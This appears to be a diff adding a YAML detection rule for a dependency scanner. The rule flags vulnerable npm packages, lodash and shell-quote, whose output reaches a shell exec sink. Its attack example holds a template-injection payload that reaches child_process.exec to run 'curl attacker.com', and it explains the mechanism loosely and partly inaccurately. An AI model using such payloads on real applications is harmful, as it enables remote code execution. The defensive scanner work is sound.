@@ -1,0 +1,47 @@
+id: sca-vulnerable-dep-to-exec
+scanner_type: SCA
+name: Vulnerable Dependency RCE to Application Exec Sink
+description: >
+  A dependency with a known RCE CVE is installed and its vulnerable API
+  is called with user-controlled input, reaching an OS command sink.
+cwe: CWE-1395
+severity: Critical
+
+source:
+  type: SCA_DEP
+  detection: >
+    Package version matches a CVE entry in NVD / OSV / GitHub Advisory DB
+  examples:
+    - package: lodash
+      vulnerable_below: 4.17.21
+      cve: CVE-2021-23337
+      vulnerable_method: _.template()
+    - package: shell-quote
+      vulnerable_below: 1.7.3
+      cve: CVE-2021-42740
+      vulnerable_method: quote()
+
+transforms:
+  - return value of vulnerable method call passed to application logic
+  - stored in variable and forwarded to exec sink
+
+sink:
+  type: SHELL_EXEC
+  note: >
+    The vulnerable dep's output reaches execa/execSync in application code.
+    Chain: dep.vulnerableMethod(userInput) → appCode → execa(result, {shell:true})
+
+cross_scanner: true
+chain_with: env-injection-to-shell
+
+attack_example: |
+  // package.json has: "lodash": "4.17.20"  (vulnerable)
+  import _ from 'lodash'
+  const template = _.template('Hello <%= user %>')
+  const rendered = template({ user: req.query.name })
+  // If name = '{{constructor.constructor("return process")().mainModule.require("child_process").exec("curl attacker.com")()}}'
+  // → RCE via prototype pollution in template engine
+
+fix:
+  description: Update dependency to patched version. Pin in lock file.
+  action: npm audit fix --force
